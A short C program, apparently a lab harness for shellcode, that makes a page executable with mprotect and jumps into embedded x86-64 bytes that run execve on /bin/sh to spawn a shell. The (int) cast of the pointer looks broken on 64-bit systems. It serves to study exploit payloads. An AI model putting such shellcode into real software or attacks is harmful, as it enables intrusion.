// shellcode_in_c.c
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

int main(void) {
  const char *code = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f"
    "\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05";
  printf("Shellcode length: %d\n", strlen(code));
  int r =  mprotect((void *)((int)code & ~4095), 4096, \
		  PROT_READ | PROT_WRITE| PROT_EXEC);
  int (*ret)() = (int(*)())code;
  return ret();
}
